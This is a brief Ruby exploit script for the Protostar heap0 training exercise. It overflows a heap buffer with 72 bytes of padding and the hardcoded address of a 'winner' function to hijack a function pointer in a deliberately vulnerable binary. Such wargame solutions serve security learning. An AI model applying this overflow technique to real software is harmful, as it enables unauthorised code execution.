#!/usr/bin/ruby

padding = "A" * 72
# address of winner: 0x08048464
winner = "\x64\x84\x04\x08"

command = <<-END
/opt/protostar/bin/heap0 #{padding+winner}
END

#puts padding+winner
puts `#{command}`
